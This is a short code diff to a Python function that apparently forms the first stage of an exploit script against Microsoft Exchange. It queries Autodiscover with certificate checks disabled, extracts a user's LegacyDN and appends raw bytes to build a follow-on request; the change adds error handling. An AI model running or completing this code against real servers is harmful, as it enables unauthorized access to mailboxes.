@@ -118,8 +118,22 @@ def get_sid(url: str, email: str):
     resp = requests.post(autodiscover_url, headers={
         "Content-Type": "text/xml"
     }, data=body.encode("utf-8"), verify=False)
-    autodiscover_xml = ET.fromstring(resp.text)
-    legacydn = autodiscover_xml.find('{*}Response/{*}User/{*}LegacyDN').text
+
+     # If status code 200 is NOT returned, the request failed
+    if resp.status_code != 200:
+        print("[Stage 1] Request failed - Autodiscover Error!")
+        exit()
+
+    # If the LegacyDN information is not in the response, the request failed as well
+    if "<LegacyDN>" not in resp.content.decode('utf8').strip():
+        print("[Stage 1] Cannot obtain required LegacyDN-information!")
+        exit()
+
+    #autodiscover_xml = ET.fromstring(resp.text)
+
+    #legacydn = autodiscover_xml.find('{*}Response/{*}User/{*}LegacyDN').text
+    legacydn = resp.content.decode('utf8').strip().split("<LegacyDN>")[1].split("</LegacyDN>")[0]
+
     print("[+] Successfully get LegacyDN")
     data = legacydn
     data += '\x00\x00\x00\x00\x00\xe4\x04'
